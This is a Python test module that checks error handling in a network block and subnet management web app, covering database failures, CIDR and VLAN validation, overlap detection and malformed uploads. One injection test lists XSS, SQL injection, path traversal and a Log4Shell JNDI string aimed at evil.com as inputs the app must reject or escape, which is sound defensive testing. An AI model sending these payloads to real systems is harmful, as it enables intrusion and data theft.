"""
Comprehensive error scenario testing.

This module tests various error conditions and edge cases including:
- Database connection failures
- Invalid input handling
- Network overlap detection
- Resource limits
- Concurrent operation conflicts
- System boundary conditions
"""

import io
from unittest.mock import patch

from app import db
from app.models import NetworkBlock, Subnet
from app.utils import DatabaseService
from app.utils.validation import check_overlapping_cidr_in_block, validate_cidr_format, validate_vlan_id


class TestDatabaseErrorScenarios:
    """Test database-related error scenarios."""

    def test_database_connection_failure(self, app_with_db, client):
        """Test handling of database connection failures."""
        with patch("app.models.db.session.commit", side_effect=Exception("Database connection lost")):
            response = client.post("/add_block", data={"block_name": "TestBlock"}, follow_redirects=True)
            # Should return 200 with user-friendly error message, not crash with 500
            assert response.status_code == 200
            assert b"error" in response.data.lower() or b"failed" in response.data.lower()

    def test_database_integrity_constraint_violation(self, app_with_db, client):
        """Test handling of database integrity constraint violations."""
        # Create a block first
        client.post("/add_block", data={"block_name": "UniqueBlock"}, follow_redirects=True)

        # Try to create duplicate block
        response = client.post("/add_block", data={"block_name": "UniqueBlock"}, follow_redirects=True)
        assert response.status_code == 200
        assert b"already exists" in response.data.lower() or b"duplicate" in response.data.lower()

    def test_database_transaction_rollback(self, app_with_db):
        """Test that database transactions roll back properly on errors."""
        initial_block_count = NetworkBlock.query.count()

        try:
            with db.session.begin():
                block = NetworkBlock(name="TestBlock", position=1)
                db.session.add(block)
                db.session.flush()  # Force the insert

                # Simulate an error that should cause rollback
                raise Exception("Simulated error")
        except Exception:
            pass  # Expected

        # Verify rollback occurred
        assert NetworkBlock.query.count() == initial_block_count


class TestInputValidationErrorScenarios:
    """Test input validation error scenarios."""

    def test_extremely_long_input_strings(self, client):
        """Test handling of extremely long input strings."""
        long_name = "A" * 1000  # Much longer than MAX_NAME_LENGTH

        response = client.post("/add_block", data={"block_name": long_name}, follow_redirects=True)
        # Should return 200 with validation error message displayed to user
        assert response.status_code == 200
        assert b"error" in response.data.lower() or b"too long" in response.data.lower()

    def test_malicious_input_injection_attempts(self, client):
        """Test handling of potential injection attacks."""
        # XSS attempts that should be rejected due to < > characters
        xss_inputs = ["<script>alert('xss')</script>", "javascript:alert('xss')"]

        for xss_input in xss_inputs:
            response = client.post("/add_block", data={"block_name": xss_input}, follow_redirects=True)
            assert response.status_code == 200
            # XSS attempts should be rejected by validation
            assert b"error" in response.data.lower() or b"invalid" in response.data.lower()
            # Should not contain the raw malicious input in response
            assert xss_input.encode() not in response.data

        # Other inputs that might be legitimate but should be properly escaped
        potentially_dangerous_inputs = ["'; DROP TABLE blocks; --", "../../../etc/passwd", "${jndi:ldap://evil.com/a}"]

        for dangerous_input in potentially_dangerous_inputs:
            response = client.post("/add_block", data={"block_name": dangerous_input}, follow_redirects=True)
            assert response.status_code == 200
            # If accepted, should be properly HTML escaped (no raw malicious content)
            if b"error" not in response.data.lower():
                # Block was created - verify it's properly escaped
                # The original input should not appear unescaped in HTML
                assert dangerous_input.encode() not in response.data or b"&#" in response.data

    def test_unicode_and_special_character_handling(self, client):
        """Test handling of unicode and special characters."""
        special_names = [
            "测试块",  # Chinese characters
            "блок",  # Cyrillic characters
            "🌟🚀💻",  # Emojis
            "Block\x00null",  # Null byte
            "Block\r\nNewline",  # Control characters
        ]

        for special_name in special_names:
            response = client.post("/add_block", data={"block_name": special_name}, follow_redirects=True)
            assert response.status_code == 200
            # Should handle gracefully without errors

    def test_empty_and_whitespace_input_validation(self, client):
        """Test validation of empty and whitespace-only inputs."""
        invalid_inputs = ["", "   ", "\t\n\r", "\x00"]

        for invalid_input in invalid_inputs:
            response = client.post("/add_block", data={"block_name": invalid_input}, follow_redirects=True)
            assert response.status_code == 200
            assert b"empty" in response.data.lower() or b"required" in response.data.lower()


class TestNetworkValidationErrorScenarios:
    """Test network-related validation error scenarios."""

    def test_invalid_cidr_formats(self):
        """Test validation of various invalid CIDR formats."""
        invalid_cidrs = [
            "192.168.1.0",  # Missing subnet mask
            "192.168.1.0/",  # Empty subnet mask
            "192.168.1.0/33",  # Invalid subnet mask
            "256.1.1.1/24",  # Invalid IP address
            "192.168.1.0/-1",  # Negative subnet mask
            "not.an.ip/24",  # Non-numeric IP
            "192.168.1.0/abc",  # Non-numeric mask
            "",  # Empty string
            "192.168.1.0/24/extra",  # Extra components
        ]

        for invalid_cidr in invalid_cidrs:
            is_valid, error_msg = validate_cidr_format(invalid_cidr)
            assert not is_valid
            assert error_msg != ""

    def test_invalid_vlan_ranges(self):
        """Test validation of invalid VLAN ID ranges."""
        invalid_vlans = [
            "0",  # Below minimum
            "4095",  # Above maximum
            "-1",  # Negative
            "abc",  # Non-numeric
            "1.5",  # Decimal
            "1000000",  # Way too large
            "",  # Empty (should be valid as optional)
        ]

        for invalid_vlan in invalid_vlans[:-1]:  # Exclude empty string
            is_valid, error_msg, parsed_vlan = validate_vlan_id(invalid_vlan)
            assert not is_valid
            assert error_msg != ""

    def test_network_overlap_detection_edge_cases(self, app_with_db):
        """Test network overlap detection in edge cases."""
        # Create test block
        block = NetworkBlock(name="TestBlock", position=1)
        db.session.add(block)
        db.session.commit()

        # Add base network
        subnet1 = Subnet(block_id=block.id, name="BaseNetwork", cidr="192.168.0.0/16", vlan_id=100)
        db.session.add(subnet1)
        db.session.commit()

        # Test various overlapping scenarios
        overlapping_networks = [
            "192.168.1.0/24",  # Subnet of existing
            "192.168.0.0/24",  # Overlaps with existing
            "192.168.0.0/16",  # Identical to existing
            "192.0.0.0/8",  # Supernet of existing
        ]

        for overlap_network in overlapping_networks:
            has_overlap, conflict_info = check_overlapping_cidr_in_block(overlap_network, block.id, exclude_id=None)
            assert has_overlap
            assert conflict_info is not None


class TestResourceLimitErrorScenarios:
    """Test resource limit and boundary condition scenarios."""

    def test_maximum_blocks_handling(self, app_with_db, client):
        """Test behavior when approaching maximum number of blocks."""
        # Create many blocks to test limits
        for i in range(50):  # Reasonable test limit
            response = client.post("/add_block", data={"block_name": f"Block{i:03d}"}, follow_redirects=True)
            if response.status_code != 200 or b"error" in response.data.lower():
                break  # Hit a limit or error

        # Should handle large numbers of blocks gracefully
        blocks = NetworkBlock.query.count()
        assert blocks > 0  # At least some blocks created

    def test_maximum_subnets_per_block(self, app_with_db, client):
        """Test behavior with many subnets in a single block."""
        # Create test block
        response = client.post("/add_block", data={"block_name": "LargeBlock"}, follow_redirects=True)
        assert response.status_code == 200

        block = NetworkBlock.query.filter_by(name="LargeBlock").first()
        assert block is not None

        # Add many subnets
        for i in range(20):  # Reasonable test limit
            response = client.post(
                "/add_subnet",
                data={
                    "block_id": block.id,
                    "name": f"Subnet{i:03d}",
                    "cidr": f"10.{i}.0.0/24",
                    "vlan_id": str(100 + i),
                },
                follow_redirects=True,
            )

            if response.status_code != 200 or b"error" in response.data.lower():
                break  # Hit a limit or error

    def test_large_csv_import_memory_handling(self, client):
        """Test memory handling with large CSV imports."""
        # Create a large CSV content (but not too large for testing)
        csv_lines = ["Block,Network,VLAN,Subnet Name"]
        for i in range(200):  # 200 rows should be reasonable
            csv_lines.append(f"LargeBlock,10.{i % 254 + 1}.0.0/24,{100 + i % 4000},Subnet{i:04d}")

        csv_content = "\n".join(csv_lines)
        csv_file = io.BytesIO(csv_content.encode("utf-8"))

        response = client.post(
            "/import_csv",
            data={"import_mode": "merge", "csv_file": (csv_file, "large_test.csv")},
            follow_redirects=True,
        )

        # Should handle large imports gracefully
        assert response.status_code == 200


class TestConcurrencyErrorScenarios:
    """Test concurrent operation error scenarios."""

    def test_concurrent_block_creation_simulation(self, app_with_db):
        """Test simulation of concurrent block creation conflicts."""
        block_name = "ConcurrentBlock"

        # Simulate race condition by checking for existing block
        # then trying to create it (as if another request created it meanwhile)
        existing = DatabaseService.get_block_by_name(block_name)
        assert existing is None

        # Create the block as if from another concurrent request
        block = NetworkBlock(name=block_name, position=1)
        db.session.add(block)
        db.session.commit()

        # Now try to create again (should detect duplicate)
        success, created_block, error_msg = DatabaseService.create_block(block_name)
        assert not success
        assert "already exists" in error_msg.lower()

    def test_concurrent_subnet_modification_simulation(self, app_with_db):
        """Test simulation of concurrent subnet modifications."""
        # Create test data
        block = NetworkBlock(name="TestBlock", position=1)
        db.session.add(block)
        db.session.commit()

        subnet = Subnet(block_id=block.id, name="TestSubnet", cidr="192.168.1.0/24", vlan_id=100)
        db.session.add(subnet)
        db.session.commit()

        # Simulate concurrent modification by checking overlap
        # then having another "request" modify the subnet
        has_overlap = check_overlapping_cidr_in_block("192.168.1.0/25", block.id, exclude_id=None)
        assert has_overlap[0]  # Should detect overlap with existing subnet


class TestSystemBoundaryErrorScenarios:
    """Test system boundary and edge case scenarios."""

    def test_disk_space_simulation(self, app_with_db, client):
        """Test behavior when disk space is limited (simulated)."""
        with patch("app.utils.DatabaseService.export_all_data", side_effect=IOError("No space left on device")):
            response = client.get("/audit")
            # Should handle disk space errors gracefully
            assert response.status_code == 200

    def test_invalid_file_uploads(self, client):
        """Test handling of invalid file uploads."""
        # Test various invalid file scenarios
        invalid_files = [
            (io.BytesIO(b"not a csv"), "test.txt"),
            (io.BytesIO(b"\x00\x01\x02\x03"), "binary.csv"),  # Binary data
            (io.BytesIO(b""), "empty.csv"),  # Empty file
        ]

        for file_content, filename in invalid_files:
            response = client.post(
                "/import_csv",
                data={"import_mode": "merge", "csv_file": (file_content, filename)},
                follow_redirects=True,
            )
            assert response.status_code == 200
            # Should handle invalid files gracefully

    def test_malformed_api_requests(self, client):
        """Test handling of malformed API requests."""
        malformed_requests = [
            ("/api/blocks", {"invalid": "data"}),
            ("/api/blocks", {"name": None}),
            ("/api/networks", {"block_id": "not_a_number"}),
            ("/api/toggle_collapse/invalid_id", {}),
        ]

        for endpoint, data in malformed_requests:
            response = client.post(endpoint, json=data)
            # Should return appropriate error codes, not crash
            assert response.status_code in [400, 404, 422, 500]

    def test_resource_cleanup_on_errors(self, app_with_db):
        """Test that resources are properly cleaned up on errors."""
        initial_count = NetworkBlock.query.count()

        # Simulate an operation that fails partway through
        try:
            with db.session.begin():
                # Create multiple objects
                for i in range(5):
                    block = NetworkBlock(name=f"TempBlock{i}", position=i)
                    db.session.add(block)
                    db.session.flush()  # Ensure they're in the session

                # Force an error
                raise Exception("Simulated error during batch operation")

        except Exception:
            pass  # Expected

        # Verify cleanup occurred
        final_count = NetworkBlock.query.count()
        assert final_count == initial_count  # No partial data left behind
